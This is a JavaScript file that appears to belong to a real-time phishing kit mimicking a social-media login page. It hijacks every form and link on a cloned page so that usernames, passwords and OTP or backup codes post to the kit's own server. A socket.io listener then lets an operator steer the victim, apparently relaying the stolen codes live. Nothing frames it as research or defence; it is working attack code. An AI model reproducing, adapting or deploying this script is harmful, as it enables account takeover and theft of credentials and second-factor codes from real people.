const urlPath = location.pathname
const urlSplit = urlPath.split("/")
const id = urlSplit[3]
const appName = urlSplit[2]

const socket = io(location.origin, {
    path: '/socket.io',
    transports: ['websocket'],
    secure: true,
})

socket.on(`${id}-listener`, data => {
    if (data.type == "response") {
        top.location.href = `${location.origin}/ws-app?id=${id}`
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll('*').forEach(element => {
    element.removeAttribute("onclick")
    element.removeAttribute('onmousedown')
})

document.querySelectorAll("form").forEach(form => {
    form.action = location.pathname
    form.method = "POST"
    form.noValidate = false

    const input = document.createElement("input")
    input.type = "hidden"
    input.name = "spikeType"
    form.append(input)
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spikeType"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

function spikeForm(data, silent = false) {
    if (silent) {
        fetch(location.href, JSON.stringify(data), {
            method: "post",
            headers: {
                "Content-Type": "application/json"
            }
        }).then(res => res.text())
            .then(data => {
                console.log(data);
            })
    } else {
        let formData = ""
        for (const key in data) {
            formData += `<input type="hidden" name="${key}" value="${data[key]}">`
        }

        const form = document.createElement("form")
        form.method = "post"
        form.action = location.href
        form.innerHTML = formData
        document.body.appendChild(form)
        form.submit()
    }
}

/**
 *  spikes selector functions +===================+
 */

const selectorSpikes = [
    {
        spikeType: "home-login",
        querys: [
            `[name="username"]`,
            `[name="password"]`
        ],
        runner() {
            document.querySelectorAll("button").forEach(btn => {
                if (btn.innerText == "Show") {
                    btn.parentElement.remove()
                }
            });

            [`[name="username"]`, `[name="password"]`].forEach(inp => {
                const input = document.querySelector(inp)
                input.addEventListener("input", () => {
                    if (input.value.length > 0) {
                        input.parentElement.style = "display: flex;flex: 1 0 0px;align-items: center;"
                        input.parentElement.className = "_aa48 _aa49"
                        checkValue()
                    } else {
                        input.parentElement.className = ""
                    }
                })
            });

            const username = document.querySelector(`[name="username"]`)
            const password = document.querySelector(`[name="password"]`)

            const passBtn = document.createElement("div")
            passBtn.className = `x6s0dn4 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 xdl72j9 x1q0g3np x1c4vz4f x2lah0s xk390pu x5yr21d xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x1sxyh0 x18d9i69 xkhd6sd x1n2onr6 xxymvpz`
            passBtn.innerHTML = `<div class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1i64zmx x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1"><button class=" _acan _acao _acat _aj1- _ap30" type="button">Show</button></div>`
            passBtn.addEventListener("click", () => {
                if (password.type == "password") {
                    password.type = "text"
                } else {
                    password.type = "password"
                }
            })
            password.parentElement.appendChild(passBtn)

            const submitBtn = document.querySelector(`[type="submit"]`)
            function checkValue() {
                if (username.value.length > 0 && password.value.length > 5) {
                    submitBtn.disabled = false
                } else {
                    submitBtn.disabled = true
                }
            }
        }
    },
    {
        spikeType: "otp-code",
        querys: [
            `[name="verificationCode"]`
        ],
        runner() {
            const otpInput = document.querySelector(`[name="verificationCode"]`)
            otpInput.addEventListener("input", () => {
                if (otpInput.value.length > 0) {
                    otpInput.parentElement.className = "_aa48 _aa49"
                } else {
                    otpInput.parentElement.className = ""
                }
            })

            document.querySelectorAll(`button`).forEach(btn => {
                if (btn.innerText == "Confirm") {
                    btn.addEventListener("click", () => {
                        document.forms[0].submit()
                    })
                }

                if (btn.innerText == "resend it") {
                    btn.addEventListener("click", () => {
                        spikeForm({
                            spikeType: "resend-otp"
                        })
                    })
                }

                if (btn.innerText == "backup codes") {
                    btn.addEventListener("click", () => {
                        spikeForm({
                            spikeType: "backup-codes"
                        })
                    })
                }

                if (btn.innerText == "text message") {
                    btn.addEventListener("click", () => {
                        spikeForm({
                            spikeType: "text-message"
                        })
                    })
                }
            })
        }
    }
]

/**
 * button spikes functions +===================+
 */

const buttonSpikes = [
    // {
    //     spikeType: "",
    //     runner() {

    //     }
    // }
]

for (const selectorSpike of selectorSpikes) {
    const spikeType = selectorSpike.spikeType
    const querys = selectorSpike.querys
    const queryLength = querys.length

    let queryMatch = 0
    for (const selector of querys) {
        if (document.querySelector(selector)) queryMatch++
    }

    if (queryLength == queryMatch) {
        addSpikeType(spikeType)
        if (selectorSpike.hasOwnProperty("runner")) {
            try {
                selectorSpike.runner()
            } catch (error) { }
        }

        break
    }
}

for (const buttonSpike of buttonSpikes) {
    try {
        buttonSpike.runner()
    } catch (error) { }
}

// +----------------+
{
    const allSlideImg = document.querySelectorAll(`img[srcset]`)
    if (allSlideImg.length != 0) {
        let slideImgIndex = 0
        setInterval(() => {
            allSlideImg.forEach(img => {
                img.className = `x972fbf xcfux6l x1qhh985 xm0m39n xk390pu xns55qn xu96u03 xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x10l6tqk x13vifvy x11njtxf xqyf9gi x1hc1fzr x1rkc77x x19991ni x1lizcpb xnpuxes xhtitgo`
            })
            if (slideImgIndex == allSlideImg.length) slideImgIndex = 0
            allSlideImg[slideImgIndex].className = `x972fbf xcfux6l x1qhh985 xm0m39n xk390pu xns55qn xu96u03 xdj266r x11i5rnm xat24cr x1mh8g0r xg01cxk xexx8yu x4uap5 x18d9i69 xkhd6sd x10l6tqk x13vifvy x11njtxf xlshs6z xqyf9gi`
            slideImgIndex++
        }, 5000)

    }
}